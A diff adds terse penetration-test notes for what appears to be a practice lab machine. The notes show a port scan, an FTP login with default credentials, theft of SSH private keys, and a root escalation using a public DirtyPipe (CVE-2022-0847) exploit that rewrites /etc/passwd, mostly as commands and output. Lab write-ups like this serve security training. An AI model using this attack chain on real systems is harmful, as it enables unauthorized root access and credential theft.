@@ -1,0 +1,62 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.224.149 > Kiero.txt
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 5c:5f:f1:bb:02:f9:14:7c:8e:38:32:2b:f4:bc:d0:8c (RSA)
+|   256 18:e2:47:e1:c8:40:a1:d0:2c:a5:87:97:bd:01:12:27 (ECDSA)
+|_  256 26:2d:98:d9:47:6d:22:5d:4a:14:7a:24:5c:98:a2:1d (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: Apache2 Ubuntu Default Page: It works
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+login ftp with kiero:kiero
+mget three files id_rsa, id_rsa.pub, id_rsa_2
+from id_rsa.pub found john@oscp
+chmod 600 id_rsa
+$ ssh -i id_rsa john@192.168.224.149
+Last login: Tue Nov 22 08:31:27 2022 from 192.168.118.3
+john@oscp:~$ id
+uid=1000(john) gid=1000(john) groups=1000(john)
+
+Linux oscp 5.9.0-050900-generic #202010112230 SMP Sun Oct 11 22:34:01 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+Sudo version 1.8.31
+
+-rwsrwsr-x 1 root root 16792 Nov 21  2022 RESET_PASSWD
+john@oscp:~$ ./RESET_PASSWD -h
+Resetting password of kiero to the default value
+john@oscp:~$ strings RESET_PASSWD
+setuid
+system
+setgid
+echo kiero:kiero | chpasswd
+echo Resetting password of 'kiero' to the default value
+
+expall
+
+https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
+john@oscp:~/dirtypipe$ l
+compile.sh  exploit-1.c  exploit-2.c
+john@oscp:~/dirtypipe$ chmod 777 compile.sh 
+john@oscp:~/dirtypipe$ ./compile.sh 
+john@oscp:~/dirtypipe$ ll
+drwxr-xr-x 2 john john  4096 Dec 22 06:28 ./
+drwxr-xr-x 7 john john  4096 Dec 22 06:27 ../
+-rwxrwxrwx 1 john john    71 Dec 22 06:27 compile.sh*
+-rwxr-xr-x 1 john john 17624 Dec 22 06:28 exploit-1*
+-rw-r--r-- 1 john john  5364 Dec 22 06:27 exploit-1.c
+-rwxr-xr-x 1 john john 18040 Dec 22 06:28 exploit-2*
+-rw-r--r-- 1 john john  7752 Dec 22 06:27 exploit-2.c
+john@oscp:~/dirtypipe$ ./exploit-1
+Backing up /etc/passwd to /tmp/passwd.bak ...
+Setting root password to "piped"...
+Password: Restoring /etc/passwd from /tmp/passwd.bak...
+Done! Popping shell... (run commands now)
+ 
+id
+uid=0(root) gid=0(root) groups=0(root)
+
+
